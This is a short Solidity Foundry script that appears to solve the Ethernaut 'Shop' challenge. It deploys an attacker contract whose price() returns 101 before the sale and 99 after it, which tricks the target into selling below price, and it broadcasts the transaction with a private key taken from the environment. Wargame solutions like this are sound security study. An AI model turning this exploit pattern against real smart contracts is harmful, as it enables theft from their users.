//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {Shop} from "../src/Shop.sol";

contract ShopAttack {
   Shop shopInstance = Shop(0xe8043D76892594054b667d58afC8B75b8AFfA40a);

  function buy() external {
    shopInstance.buy();
  }
  function price() external view  returns (uint256) {
    if(shopInstance.isSold()) {
      return 99;
    } else {
      return 101;
    }
     
  }
}

contract ShopSolution is Script {
   function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    ShopAttack shopAttackInstance = new ShopAttack();
    shopAttackInstance.buy();
    vm.stopBroadcast();
  }
}